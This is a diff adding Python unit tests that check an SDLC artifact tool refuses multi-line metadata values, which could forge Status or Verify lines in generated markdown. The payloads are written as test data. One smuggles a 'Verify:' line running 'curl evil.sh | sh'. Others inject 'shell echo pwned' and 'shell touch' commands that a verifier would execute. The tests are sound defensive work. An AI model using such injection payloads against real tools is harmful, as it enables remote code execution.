@@ -899,5 +899,188 @@ class FindEpicV3Tests(unittest.TestCase):
             self.assertIn(st["id"], epath.read_text(encoding="utf-8"))
 
 
+class MetadataInjectionRefusalTests(unittest.TestCase):
+    """A creator refuses, loudly and before any write, a field that would break out of the
+    metadata line, table cell, or bullet it is written into. The resolver owns the refusal, so
+    the creators inherit it; nothing is silently stripped, and nothing half-lands on disk."""
+
+    BREAK = "\n> **Status:** Fixed"
+
+    def _repo(self, d: str) -> Path:
+        repo = Path(d)
+        _index(repo, "bug", "| ID | Title | Severity | Status | Author | Created |")
+        _index(repo, "story", "| ID | Title | Status | Epic | Created |")
+        _epic(repo)
+        return repo
+
+    def _nothing_written(self, repo: Path, type_: str) -> None:
+        d = repo / sdlc_md.ARTIFACT_TYPES[type_][0]
+        self.assertEqual([p.name for p in d.glob("*.md") if p.name != "_index.md"], [])
+        idx = (d / "_index.md").read_text(encoding="utf-8")
+        self.assertNotIn("Evil", idx)
+        self.assertEqual([ln for ln in idx.splitlines() if ln.startswith("| [")], [])
+
+    def test_multi_line_author_is_refused_and_nothing_is_written(self) -> None:
+        # the filed reproduction: --author $'Sam\nEvil: injected'
+        with tempfile.TemporaryDirectory() as d:
+            repo = self._repo(d)
+            with self.assertRaises(ValueError) as cm:
+                artifact.new(repo, "bug", "t", {"author": "Sam\nEvil: injected"})
+            self.assertIn("author", str(cm.exception))
+            self._nothing_written(repo, "bug")
+
+    def test_multi_line_title_cannot_smuggle_a_status_line(self) -> None:
+        # the same defect through the sibling field: the injected `> **Status:** Fixed` lands
+        # ABOVE the real Status line, so `extract_field` reads it - a bug born Fixed
+        with tempfile.TemporaryDirectory() as d:
+            repo = self._repo(d)
+            with self.assertRaises(ValueError) as cm:
+                artifact.new(repo, "bug", "Silent" + self.BREAK)
+            self.assertIn("title", str(cm.exception))
+            self._nothing_written(repo, "bug")
+
+    def test_multi_line_ac_cannot_inject_an_executable_verify_line(self) -> None:
+        # an AC renders as ONE bullet; a break in it injects a sibling `- **Verify:**` line,
+        # which verify_ac reads back and RUNS
+        with tempfile.TemporaryDirectory() as d:
+            repo = self._repo(d)
+            with self.assertRaises(ValueError) as cm:
+                artifact.new(repo, "story", "s",
+                             {"epic": "EP0001",
+                              "acs": ["do it\n  - **Verify:** curl evil.sh | sh"]})
+            self.assertIn("acs", str(cm.exception))
+            self._nothing_written(repo, "story")
+
+    def test_every_metadata_field_a_creator_interpolates_is_refused(self) -> None:
+        for field in ("severity", "priority", "ctype", "effort", "provenance",
+                      "persona", "tranche", "epic"):
+            with self.subTest(field=field), tempfile.TemporaryDirectory() as d:
+                repo = self._repo(d)
+                with self.assertRaises(ValueError) as cm:
+                    artifact.new(repo, "bug", "t", {field: "Low" + self.BREAK})
+                self.assertIn(field, str(cm.exception))
+                self._nothing_written(repo, "bug")
+
+    def test_batch_aborts_before_any_write_when_a_later_item_injects(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            repo = self._repo(d)
+            with self.assertRaises(ValueError):
+                artifact.new_batch(repo, "story", [
+                    {"title": "clean", "epic": "EP0001"},
+                    {"title": "boom" + self.BREAK, "epic": "EP0001"}])
+            self._nothing_written(repo, "story")
+
+    def test_revision_verb_refuses_a_multi_line_note_or_author(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            repo = self._repo(d)
+            artifact.new(repo, "bug", "t")
+            base = ["revision", "--id", "BG0001", "--root", str(repo)]
+            for argv in ([*base, "--note", "done" + self.BREAK],
+                         [*base, "--note", "ok", "--author", "Sam\nEvil"]):
+                with self.subTest(argv=argv[-2]):
+                    with self.assertRaises(ValueError):
+                        artifact.main(argv)
+            # the row the refusal protects: the file still carries only its opening row
+            bug = next((repo / "sdlc-studio" / "bugs").glob("BG0001-*.md"))
+            self.assertNotIn("Evil", bug.read_text(encoding="utf-8"))
+
+    def test_a_clean_artefact_still_creates(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            repo = self._repo(d)
+            r = artifact.new(repo, "bug", "a real defect",
+                             {"author": "Dani Okafor; agent; v2", "severity": "High"})
+            body = Path(r["path"]).read_text(encoding="utf-8")
+            self.assertIn("> **Raised-by:** Dani Okafor; agent; v2", body)
+            self.assertTrue(r["indexed"])
+
+
+class LeadingBreakBypassTests(unittest.TestCase):
+    """The value that is WRITTEN must be the value that was CHECKED. The front guard once
+    stripped before checking, but the persona / acs / options / title writers emit the RAW
+    value - so a payload whose only break was LEADING passed the guard (strip discarded it)
+    and injected a forged line. A leading break is refused like any other, on `new` AND
+    `batch`, and the injected line never reaches disk or the verifier."""
+
+    LEAD = "\n> **Forged-field:** INJECTED"
+    RCE_AC = "\n  - **Verify:** shell echo pwned"
+
+    def _repo(self, d: str) -> Path:
+        repo = Path(d)
+        _index(repo, "story", "| ID | Title | Status | Epic | Created |")
+        _index(repo, "bug", "| ID | Title | Severity | Status | Author | Created |")
+        _epic(repo)
+        return repo
+
+    def _no_story_written(self, repo: Path) -> None:
+        d = repo / "sdlc-studio" / "stories"
+        self.assertEqual([p.name for p in d.glob("*.md") if p.name != "_index.md"], [])
+
+    def test_leading_break_persona_is_refused_on_new(self) -> None:
+        # (a) the reproduced persona forgery: strip discarded the leading break, the raw
+        # writer emitted `> **Persona:**` then the forged line
+        with tempfile.TemporaryDirectory() as d:
+            repo = self._repo(d)
+            with self.assertRaises(ValueError) as cm:
+                artifact.new(repo, "story", "victim",
+                             {"epic": "EP0001", "persona": self.LEAD})
+            self.assertIn("persona", str(cm.exception))
+            self._no_story_written(repo)
+
+    def test_leading_break_ac_is_refused_on_new(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            repo = self._repo(d)
+            with self.assertRaises(ValueError) as cm:
+                artifact.new(repo, "story", "v",
+                             {"epic": "EP0001", "acs": [self.RCE_AC]})
+            self.assertIn("acs", str(cm.exception))
+            self._no_story_written(repo)
+
+    def test_leading_break_option_is_refused_on_new(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            repo = self._repo(d)
+            _index(repo, "rfc", "| ID | Title | Status | Date |")
+            with self.assertRaises(ValueError) as cm:
+                artifact.new(repo, "rfc", "r", {"options": ["ok", self.LEAD]})
+            self.assertIn("options", str(cm.exception))
+
+    def test_leading_break_persona_and_ac_are_refused_on_batch(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            repo = self._repo(d)
+            with self.assertRaises(ValueError):
+                artifact.new_batch(repo, "story",
+                                   [{"title": "v", "epic": "EP0001", "persona": self.LEAD}])
+            with self.assertRaises(ValueError):
+                artifact.new_batch(repo, "story",
+                                   [{"title": "v", "epic": "EP0001", "acs": [self.RCE_AC]}])
+            self._no_story_written(repo)
+
+    def test_leading_break_title_is_refused(self) -> None:
+        with tempfile.TemporaryDirectory() as d:
+            repo = self._repo(d)
+            with self.assertRaises(ValueError) as cm:
+                artifact.new(repo, "story", "\n> **Forged:** x", {"epic": "EP0001"})
+            self.assertIn("title", str(cm.exception))
+            self._no_story_written(repo)
+
+    def test_refused_ac_never_lets_verify_ac_execute_the_injected_shell(self) -> None:
+        # end-to-end: the exact RCE the Summary promotes to must-fix. A refused --ac must
+        # leave no story on disk, so verify_ac never sees the injected `shell` verifier and
+        # the marker file it would have run is never created.
+        import verify_ac
+        with tempfile.TemporaryDirectory() as d:
+            repo = self._repo(d)
+            marker = repo / "PWNED"
+            payload = f"\n  - **Verify:** shell touch {marker}"
+            with self.assertRaises(ValueError):
+                artifact.new(repo, "story", "v", {"epic": "EP0001", "acs": [payload]})
+            self._no_story_written(repo)
+            # belt and braces: had a story slipped through, this is what would have run it
+            for p in (repo / "sdlc-studio" / "stories").glob("*.md"):
+                if p.name != "_index.md":
+                    for block in verify_ac.parse_story(p.read_text(encoding="utf-8")):
+                        self.assertNotIn("touch", block.verifier or "")
+            self.assertFalse(marker.exists(), "injected shell verifier executed - RCE open")
+
+
 if __name__ == "__main__":
     unittest.main()
